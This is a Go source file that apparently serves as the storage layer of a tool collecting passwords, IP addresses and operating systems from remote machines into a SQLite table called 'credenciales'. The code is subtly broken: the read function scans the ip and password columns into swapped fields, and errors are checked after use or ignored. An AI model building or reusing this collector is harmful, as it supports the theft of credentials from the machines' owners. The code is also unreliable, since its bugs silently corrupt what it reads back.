package data

import (
	_ "github.com/mattn/go-sqlite3"
	"database/sql"
	"log"
)

var DB *sql.DB

func Init() {
	db, err := sql.Open("sqlite3", "./info.db")
	if err!= nil {
		log.Fatal(err)
	}


	DB = db

	init_query := `
CREATE TABLE IF NOT EXISTS credenciales (
	id INTEGER PRIMARY KEY AUTOINCREMENT,
	ip TEXT,
	password TEXT,
	so TEXT
)
`

	_, err = db.Exec(init_query)
	if err != nil {
		log.Fatal(err)
	}

	log.Println("[+] Tabla credenciales abierta")
}

func AddData(res DataReceived){
	state, err := DB.Prepare("INSERT INTO credenciales (ip, password, so) VALUES (?,?,?)")
	state.Exec(res.IP, res.Password, res.SO)
	defer state.Close()

	if err != nil {
		log.Fatal(err)
	}

	log.Println("[+] Added")
}

func SeeData() []DataReceived{
	rows, _ := DB.Query("SELECT id, ip, password, so FROM credenciales")
	defer rows.Close()
	if rows.Err() != nil {
		log.Fatal(rows.Err())
	}

	files := make([]DataReceived,0)

	for rows.Next() {
		curr := DataReceived{}
		err := rows.Scan(&curr.Id, &curr.Password, &curr.IP, &curr.SO)
		if err != nil {
			log.Fatal(err)
		}

		files = append(files, curr)
	}

	return files
}
